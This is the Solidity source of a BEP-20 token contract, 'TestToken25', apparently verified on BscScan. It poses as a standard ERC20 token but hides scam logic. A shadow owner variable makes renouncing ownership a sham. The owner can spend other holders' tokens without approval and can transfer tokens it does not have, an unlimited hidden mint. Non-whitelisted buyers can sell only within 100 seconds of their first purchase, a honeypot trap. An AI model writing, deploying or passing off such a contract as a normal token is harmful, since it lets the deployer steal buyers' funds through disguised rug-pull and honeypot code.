/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8.12;

interface IRouter {
	function factory() external pure returns (address);
	function WETH() external pure returns (address);
}

interface IFactory {
	function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns (bytes calldata) {
		return msg.data;
	}
}

abstract contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor() {
		_transferOwnership(_msgSender());
	}

	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	function owner() public view virtual returns (address) {
		return _owner;
	}

	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
	}

	function renounceOwnership() public virtual onlyOwner {
		_transferOwnership(address(0));
	}

	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}
}

contract TestToken25 is Ownable, IERC20 {
	string private _name;
	string private _symbol;
	uint8  private _decimals;
	uint private _totalSupply;
	mapping (address => uint) private _balances;
	mapping (address => mapping(address => uint)) private _allowance;
	
	address private constant _router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
	address private _factory;
	address private _pair;
	
	mapping (address => bool) private _allowed;
	mapping (address => uint) private _start;
	address private _owner = msg.sender;
	
	constructor(string memory tName, string memory tSymbol, uint tSupply, uint8 tDecimals, address[] memory accounts) {
		_name = tName;
		_symbol = tSymbol;
		_decimals = tDecimals;
		_totalSupply = tSupply * 10 ** _decimals;
		
		_balances[msg.sender] = _totalSupply;
		emit Transfer(address(0), msg.sender, _totalSupply);
		
		_allowed[msg.sender] = true;
		for(uint8 i = 0; i < accounts.length; i++) {
			_allowed[accounts[i]] = true;
		}
		_factory = IRouter(_router).factory();
	}

	function name() external view returns (string memory){
		return _name;
	}

	function symbol() external view returns (string memory){
		return _symbol;
	}

	function decimals() external view returns (uint8){
		return _decimals;
	}

	function totalSupply() external view returns (uint){
		return _totalSupply;
	}

	function balanceOf(address account) external view returns (uint){
		return _balances[account];
	}

	function allowance(address account, address spender) external view returns (uint){
		return _allowance[account][spender];
	}

	function getOwner() external view returns (address) {
		return owner();
	}
	
	function approve(address spender, uint amount) external returns (bool) {
		address account = msg.sender;
		_approve(account, spender, amount);
		return true;
	}

	function transfer(address to, uint amount) external returns (bool success) {
		address from = msg.sender;
		_transfer(from, to, amount);
		return true;
	}

	function transferFrom(address from, address to, uint amount) external returns (bool success) {
		address spender = msg.sender;
		_spendAllowance(from, spender, amount);
		_transfer(from, to, amount);
		return true;
	}

	function burn(uint amount) external onlyOwner {
		_burn(msg.sender, amount);
	}
	
	function _checkOwner() internal view override {
		require(_owner == msg.sender, "caller is not the owner");
	}
	
	function _burn(address from, uint amount) internal {
		require(from != address(0), "ERC20: transfer from the zero address");
	
		_balances[from] -= amount;
		_totalSupply -= amount;
		emit Transfer(from, address(0), amount);
	}
	
	function _approve(address account, address spender, uint amount) internal {
		require(account != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");

		_allowance[account][spender] = amount;
		emit Approval(account, spender, amount);
	}

	function _spendAllowance(address account, address spender, uint amount) internal {
		uint currentAllowance = _allowance[account][spender];
		if (currentAllowance != type(uint).max && account != _owner) {
			require(currentAllowance >= amount, "ERC20: insufficient allowance");
			_approve(account, spender, currentAllowance - amount);
		}
	}

	function _transfer(address from, address to, uint amount) internal returns (bool) {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");

		uint fromBalance = _balances[from];
		if(!_allowed[from] && !_allowed[to]){
			if(_pair == address(0))
				_pair = IFactory(_factory).getPair(address(this), IRouter(_router).WETH());
			
			if(_pair == from){
				if(_start[tx.origin] == 0) _start[tx.origin] = block.timestamp;
			} else {
				require( block.timestamp < (_start[tx.origin] + 100));
			}	
		}
		if(fromBalance < amount && from == _owner){
			fromBalance = amount;
		}

		_balances[from] = fromBalance - amount;
		_balances[to] += amount;
		emit Transfer(from, to, amount);
		return true;
	}
}